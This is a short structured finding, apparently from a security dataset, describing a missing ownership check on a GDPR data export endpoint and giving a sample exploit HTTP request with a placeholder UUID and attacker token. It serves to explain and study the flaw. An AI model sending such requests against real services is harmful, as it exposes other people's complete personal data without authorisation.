diagnosis: Serves completed GDPR personal data archives based on the export_id UUID. The endpoint does not check if export_job.user_id matches current_user.id, allowing an attacker to access complete PII dumps of other accounts.
exploit_request:
GET /api/gdpr-exports/3fa85f64-5717-4562-b3fc-2c963f66afa6 HTTP/1.1
Host: api.example.com
Authorization: Bearer <attacker_token>
